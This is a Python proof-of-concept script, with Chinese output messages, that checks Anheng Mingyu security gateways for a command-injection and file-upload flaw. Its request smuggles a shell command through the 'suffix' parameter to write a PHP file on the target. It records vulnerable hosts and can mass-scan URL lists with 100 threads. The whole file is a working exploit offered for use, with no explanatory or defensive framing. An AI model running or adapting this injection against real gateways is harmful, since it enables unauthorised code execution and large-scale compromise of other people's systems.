import argparse
import requests
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    banner ="""
     ██▓    ▄▄▄       ███▄ ▄███▓    ▄▄▄          ██ ▄█▀ ██▓ ███▄    █   ▄████ 
▓██▒   ▒████▄    ▓██▒▀█▀ ██▒   ▒████▄        ██▄█▒ ▓██▒ ██ ▀█   █  ██▒ ▀█▒
▒██▒   ▒██  ▀█▄  ▓██    ▓██░   ▒██  ▀█▄     ▓███▄░ ▒██▒▓██  ▀█ ██▒▒██░▄▄▄░
░██░   ░██▄▄▄▄██ ▒██    ▒██    ░██▄▄▄▄██    ▓██ █▄ ░██░▓██▒  ▐▌██▒░▓█  ██▓
░██░    ▓█   ▓██▒▒██▒   ░██▒    ▓█   ▓██▒   ▒██▒ █▄░██░▒██░   ▓██░░▒▓███▀▒
░▓      ▒▒   ▓▒█░░ ▒░   ░  ░    ▒▒   ▓▒█░   ▒ ▒▒ ▓▒░▓  ░ ▒░   ▒ ▒  ░▒   ▒ 
 ▒ ░     ▒   ▒▒ ░░  ░      ░     ▒   ▒▒ ░   ░ ░▒ ▒░ ▒ ░░ ░░   ░ ▒░  ░   ░ 
 ▒ ░     ░   ▒   ░      ░        ░   ▒      ░ ░░ ░  ▒ ░   ░   ░ ░ ░ ░   ░ 
 ░           ░  ░       ░            ░  ░   ░  ░    ░           ░       ░ 
                                                               version:1.0
                                                               author:YeahSir           
    """
    print(banner)

def poc(target):
    payload_url = '/webui/?g=aaa_portal_auth_local_submit&bkg_flag=0&$type=1&suffix=1%7Cecho+%22The%20website%20has%20vulnerabilities%22+%3E+check.php'
    url = target + payload_url
    headers = {
        "User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15",
        "Content-Type":"multipart/form-data; boundary=849978f98abe41119122148e4aa65b1a",
        "Accept-Encoding":"gzip",
        "Content-Length":"200",
    }
    data = {
        '123': ('test.php', 'This website has a vulnerability!!!', 'text/plain')
    }
    try:
        res1 = requests.get(url=target, verify=False)
        if res1.status_code == 200:
            res2 = requests.post(url=url, headers=headers, data=data, verify=False)
            if 'success' in res2.text :
                print(f'[+] 该url{target}存在漏洞')
                with open('result.txt','a',encoding='utf-8') as f:
                    f.write(target+'\n')
            else:
                print(f'[-]该站点{target}不存在漏洞')
    except Exception as e:
        print(f'[0]该站点{target}存在访问问题，请手动测试')

def main():
    banner()
    parser = argparse.ArgumentParser(description=" 安恒明御安全网关aaa_local_web_preview文件上传漏洞")
    parser.add_argument("-u", "--url", type=str, help="python MingyuUploadCheck.py -u url")
    parser.add_argument("-f", "--file", type=str, help="python MingyuUploadCheck.py -f file")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n', ''))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()

if __name__ == '__main__':
    main()